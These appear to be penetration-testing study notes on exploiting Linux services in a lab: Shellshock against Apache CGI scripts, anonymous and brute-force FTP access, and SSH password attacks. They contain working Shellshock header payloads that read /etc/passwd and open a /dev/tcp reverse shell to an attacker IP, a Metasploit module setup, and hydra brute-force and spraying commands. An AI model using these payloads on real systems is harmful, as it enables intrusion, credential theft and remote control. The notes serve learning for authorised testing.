# Linux Vulnerabilities

Linux is an OS which is often found running on servers. This means it is vital for us as penetration testers to understand linux and how to exploit it.

There are some common sevices which are found on linux systems - in this section we will be looking at what these are and how to exploit them.

The following table summarises the services we will look at:

| Service | Ports | Purpose |
| ---|---|---|
| Apache | 80, 443 | Web server which is used on 80% of global web servers |
| SSH | 22 | Secure remote access to control systems across unsecured networks |
| FTP | 21 | File sharing between a client and server and vice-versa |
| SAMBA | 445 | Linux implementation of SMB - allows windows machines to access linux shares and devices and vice-versa |

## Exploiting Apache via CVE-2014-6271 aka Shellshock

The shellshock family of vulnerabilities let attackers execute system commands remotely on a linux system which is vulnerable.

Two services are involved - *apache* and *bash* - which is why we are covering it here in the section relating to exploiting apache.

>[!NOTE]
>Shellshock is hardly ever seen anymore - it was so important it is worthwhile knowing about

### Context

Apache web servers which have been set up to run Common Gateway Interface scripts or .sh scripts could be vulnerable to shellshock.

>[!NOTE]
>CGI scripts are used by Apache to execute commands on the Linux system and show the output to the client

We can develop our own CGI scripts to perform commands on web-servers.

Shellshock takes advantage of this feature of apache along with a vulnerability in older versions of bash which execute commands after the series of characters `() {:;}`

### Exploitation

We need to find a way to communicate with the vulnerable version of bash - this is where CGI scripts come into play. If we can find CGI scripts on the targeted server, we can utilise them to send to bash the series of characters followed by the command we would like to have executed on the remote system.

When we make an html request using a CGI script, the web server will start a new process and execute the script with bash.

We therefore want to keep an eye open for .cgi scripts being used by web applications. We can look in source code to help with this - we might find a GET request is being made to a .cgi script.

We need to also make sure that the server is vulnerable to shellshock. To do this, we can run an nmap script:

```bash
sudo nmap -sV 192.168.56.101 --script=http.shellshock --script-args "http-shellshock.uri=/vulnscript.cgi"
```

>[!NOTE]
>The path to the CGI script is included as the value passed to the `http-shellshock.uri` argument

#### Manual Method

To exploit a shellshock vulnerability manually once we have found one and a .cgi script to use, we can use a proxy server such as burpsuite or zap to intercept a GET request to the CGI script.

The easiest and best place to inject the sequence of characters along with a command which we would like to have executed on the target web-server is in the `User-Agent` http header like so:

```bash
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

If we get success with a command such as `id` or `cat /etc/passwd` we can try different commands to get a reverse shell.

We can start a netcat listener on our attacking machine:

```bash
sudo nc -nlvp 4444
```

We can then try different ways to get a bash reverse shell. One way is shown below:

```bash
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.168.56.108/4444 0>&1'
```

>[!NOTE]
>If the above injection does not work, it is worth URL encoding it and / or trying a different command for the actual reverse shell

#### Automated Exploitation

We can automate the exploitation of a shellshock vulnerability using the msfconsole module `exploit/multi/http/apache_mod_cgi_bash_env_exec`

We will need to set `RHOSTS` and `TARGETURI` - in the example we have been using so far, this would look as follows:

```bash
set RHOSTS 192.168.56.101
set TARGETURI /vulnscript.cgi
run
```

This will (hopefully) give us a meterpreter session on the target system.

## Exploiting FTP

It is worth knowing how to exploit File Transfer Protocol becuase it is used on lots of linux systems.

FTP is used to facilitate the sharing of data between machines - typically this is between a client and a web-server - an example would be a person transfering their website files to their web-server using FTP.

### Anonymous Access

FTP is protected by username:password authentication and by default this is enabled. It is possible to allow *anonymous* access to a system using FTP but this is not normally found. Still, we can test for anonymous FTP access using: `sudo ftp 192.168.56.101` and then using the username `anonymous` with a blank password when prompted to input them.

>[!NOTE]
>Sometimes we will need to use the *passive* mode to connect to FTP - we can use `sudo ftp -p 192.168.56.101` to do so.

### Brute Force Attacks

Typically we do not find *anonymous* access to a server via FTP since it will be set up with username:password authentication.

We can therefore attempt a brute-force attack against FTP.

>[!TIP]
>Password spraying attacks are better than dictionary brute-force attacks

We can use different tools such as *hydra* and *patator* to perform these attacks. Hydra is a good tool and we can launch a dictionary brute-force attack against FTP with it using:

```bash
sudo hydra -L users.txt -P passes.txt ftp://10.10.187.241:2121 -t 4
```

>[!NOTE]
>In the above example the port is specified as `2121` since FTP can be configured to run on any port not just its default of `21` - always check all ports when port scanning

We can also launch a *password spraying* attack using hydra like so:

```bash
sudo hydra hydra -L users.txt -p Password1 ftp://10.10.187.241:2121 -t 4
```

>[!CAUTION]
>Running *hydra* with the default number of threads - 16 - can crash FTP servers - this is why we like to slow things down using `-t 4`

### Enumeration

If we manage to get access to a server via FTP, we can enumerate it using common system commands such as `dir` and `cd`

If we want to download a file we can use: `get confidential.txt` and if we want to download all the resources in a directory we can use `mget *` This makes use of `mget` which lets us download *multiple* files and the `*` wildcard which specifies *all* files.

>[!NOTE]
>It is best to be in the *binary* transfer mode when downloading data using FTP - we can enter this mode using `binary`

### Version Exploits

Like other services, it is also possible to exploit vulnerabilities in specific versions of FTP. In order to do this, we will need to enumerate the version and then search for any vulnerabilities along with exploit code for it.

We can research using search engines or *searchsploit*.

## Exploiting SSH

Secure SHell is a tool used to remotely access machines. Since linux is used on lots of servers and people need to access those servers remotely, SSH is found on lots of linux machines.

>[!TIP]
>Always port scan all ports - SSH runs by default on port 22 but it is often found running on non-default ports

In order to exploit SSH, we can either attempt to brute-force a login or we can look for specific exploits pertaining to the specific version of SSH which is running. If we go down the route of looking for exploits for the version of SSH which is running we can research using search engines of we can look on *searchsploit*.

>[!NOTE]
>If we manage to get a session using SSH we will have a fully functional shell

### Authentication

SSH has two methods of authentication. The more secure form is the use of a public and private key which are mathematically related. The public key is kept on the server whilst the private key is kept by the client. If this method of authentication is being used, we will not be able to brute-force login credentials - we would need to somehow get a copy of the private key which is highly unlikely since private keys are kept secret by their owners.

Lots of SSH services are still configured to use username:password authentication, however, so we can attempt a password spraying attack or dictionary brute-force attack sometimes. As for other services such as FTP we can use tools such as patator or hydra.

```bash
sudo hydra -L users.txt -P passes.txt ssh://10.10.187.241:22 -t 4
```

The better method which is a *password spraying* attack can be run using:

```bash
sudo hydra -L users.txt -p Password1 ssh://10.10.187.241:22 -t 4
```

>[!IMPORTANT]
>Just like FTP we can crash SSH if we run *hydra* with the default 16 threads - this is why we use `-t 4` to slow the attack down
